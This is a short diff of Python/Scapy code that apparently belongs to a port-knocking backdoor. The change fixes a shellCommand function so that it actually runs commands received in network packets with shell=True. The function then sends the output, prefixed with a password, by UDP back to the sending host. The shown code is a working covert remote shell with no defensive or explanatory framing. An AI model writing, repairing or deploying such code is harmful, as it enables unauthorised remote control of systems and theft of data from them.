@@ -56,7 +56,7 @@ def knock(packet):
 
 def shellCommand(packet, command):
     print "Running command " + command
-    output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     output = password + output.stdout.read() + output.stderr.read()
     packet = IP(dst=packet[0][1].src)/UDP(dport=8000, sport=8000)/Raw(load=output)
     send(packet)
